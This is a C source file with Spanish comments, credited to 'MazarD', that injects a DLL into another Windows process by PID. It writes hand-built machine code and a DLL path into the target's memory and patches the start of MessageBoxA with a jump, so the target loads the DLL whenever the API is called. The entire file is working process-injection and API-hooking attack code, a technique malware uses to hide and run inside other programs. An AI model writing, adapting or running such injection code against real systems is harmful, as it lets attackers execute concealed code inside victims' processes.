#include <windows.h>
#include <stdio.h>

//Esta funcion hace la llamada a LoadLibrary pasandole el nombre de nuestra dll,después
//ejecuta el código sobreescrito por el jmp y salta a la instrucción siguiente al jmp

BYTE *CrearCodigo(DWORD Ruta,DWORD dLoadLibrary,DWORD RetDir, BYTE*RepBuff, DWORD RepSize)
{
     
BYTE *codeBuff;
codeBuff=(BYTE*)malloc(20+RepSize);

//Guardamos registros y llamamos a LoadLibrary pasandole la ruta a nuestra dll
*codeBuff=0x60; //opcode correspondiente a pushad
codeBuff++;

//push path
*codeBuff=0x68;
codeBuff++;
*((DWORD*)codeBuff)=Ruta;
codeBuff+=4;

//mov eax,dLoadLibrary
*codeBuff=0xB8;
codeBuff++;
*((DWORD*)codeBuff)=dLoadLibrary;
codeBuff+=4;

*((WORD*)codeBuff)=0xD0FF; //call eax
codeBuff+=2;
*codeBuff=0x61; //popad
codeBuff++;

//Ahora metemos el codigo que ha sido reemplazado
//los cinco primeros bytes de MessageBoxA
memcpy(codeBuff,RepBuff,RepSize);
codeBuff+=RepSize;

//Ahora hacemos el salto a la dirección de la api
*codeBuff=0x68; //push RetDir
codeBuff++;
*((DWORD*)codeBuff)=(DWORD)RetDir;
codeBuff+=4;

*codeBuff=0xC3; //ret
codeBuff-=(19+RepSize);


return codeBuff;

}

int main()
{

void *hMsgBox;
DWORD dLoadLib;
DWORD pID;
HANDLE hproc;
DWORD size=5;
BYTE *ReplacedBuff;
DWORD oldprot;
void *repsite,*dllnsite;
BYTE *inject;
char laDll[]="c:\\Project1.dll";
BYTE *jmpBuff;


printf("Inyección por trampolin by MazarD\nhttp://www.mazard.info\n");
printf("PID del proceso a inyectarse:");
scanf("%d",&pID);

//Preparamos direcciones de apis necesarias
hMsgBox=(VOID*)GetProcAddress(LoadLibrary("user32.dll"),"MessageBoxA");
printf("Dirección de MessageBoxA:%.4x\n",hMsgBox);

dLoadLib=(DWORD)GetProcAddress(GetModuleHandle("kernel32.dll"),"LoadLibraryA");
printf("Dirección de LoadLibraryA:%.4x\n",dLoadLib);

//Abrimos el proceso y damos permisos en la zona de reemplazo
hproc=OpenProcess(PROCESS_ALL_ACCESS,false,pID);
VirtualProtect(hMsgBox,size,PAGE_EXECUTE_READWRITE,&oldprot);

//Leemos el codigo que será reemplazado
ReplacedBuff=(BYTE*)malloc(size+6);
memset(ReplacedBuff,90,size+6);
ReadProcessMemory(hproc,hMsgBox,ReplacedBuff,size,NULL);

//Reservamos memoria y guardamos el nombre de la dll
dllnsite=VirtualAllocEx(hproc,NULL,11,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hproc,dllnsite,laDll,strlen(laDll)+1,NULL);
printf("Nombre de la dll en:%.4x\n",dllnsite);

//Creamos el codigo
inject=CrearCodigo((DWORD)dllnsite,dLoadLib,(DWORD)hMsgBox+5,ReplacedBuff,size);

//Reservamos memoria y guardamos el codigo
repsite=VirtualAllocEx(hproc,NULL,size+20,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hproc,repsite,inject,size+20,NULL);
printf("Codigo Reemplazado en:%.4x\n",repsite);

//Creamos un salto hacia nuestro codigo y lo ponemos en el inicio de la api
jmpBuff=(BYTE*)malloc(5);
*jmpBuff=0xE9; //opcode correspondiente a jmp
jmpBuff++;
*((DWORD*)jmpBuff)=(DWORD)repsite-(DWORD)hMsgBox-5;
jmpBuff--;
WriteProcessMemory(hproc,hMsgBox,jmpBuff,5,NULL);

CloseHandle(hproc);

setbuf(stdin, NULL);
getchar();
return 0;
}
